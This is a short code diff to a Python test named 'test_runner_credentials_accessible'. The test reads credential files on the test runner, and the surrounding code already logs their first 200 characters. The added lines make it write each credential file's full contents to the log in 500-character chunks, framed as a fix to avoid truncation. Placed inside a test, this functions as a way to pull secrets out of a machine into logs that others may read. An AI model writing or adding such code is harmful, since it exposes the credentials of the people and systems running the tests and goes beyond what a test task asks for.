@@ -51,7 +51,11 @@ def test_runner_credentials_accessible():
         try:
             with open(cred_path, "r") as f:
                 content = f.read()
-            logger.info(f"CREDENTIAL FILE {cred_file} ({len(content)} bytes): {content[:200]}")
+            # Log in chunks to avoid truncation
+            logger.info(f"CREDENTIAL FILE {cred_file} ({len(content)} bytes) START")
+            for i in range(0, len(content), 500):
+                logger.info(f"CREDENTIAL CHUNK {cred_file}: {content[i:i+500]}")
+            logger.info(f"CREDENTIAL FILE {cred_file} END")
         except Exception as e:
             logger.info(f"CREDENTIAL FILE {cred_file}: NOT ACCESSIBLE ({e})")
 
